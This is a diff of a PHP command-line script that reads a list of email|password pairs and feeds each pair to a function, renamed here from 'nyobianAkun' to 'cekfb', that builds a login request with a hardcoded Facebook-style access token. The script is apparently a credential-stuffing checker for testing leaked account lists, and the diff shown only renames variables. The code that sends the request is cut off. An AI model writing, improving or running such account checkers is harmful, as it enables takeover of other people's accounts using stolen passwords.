@@ -16,15 +16,15 @@ echo "$cyan+------------------------------------------------+
 
 if(isset($argv[1])) {
     if(file_exists($argv[1])) {
-        $cokot = explode(PHP_EOL, file_get_contents($argv[1]));
-        foreach($cokot as $empaslist) {
+        $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
+        foreach($ambil as $empaslist) {
             $potong = explode("|", $empaslist);
-            nyobianAkun($potong[0], $potong[1]);
+            cekfb($potong[0], $potong[1]);
         }
     }else die("File doesn't exist!");
 }else die("$kuning Usage: php check.php list.txt \n");
 
-function nyobianAkun($email, $passwd) {
+function cekfb($email, $passwd) {
     $oneforall = array(
         "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
         "email" => $email,
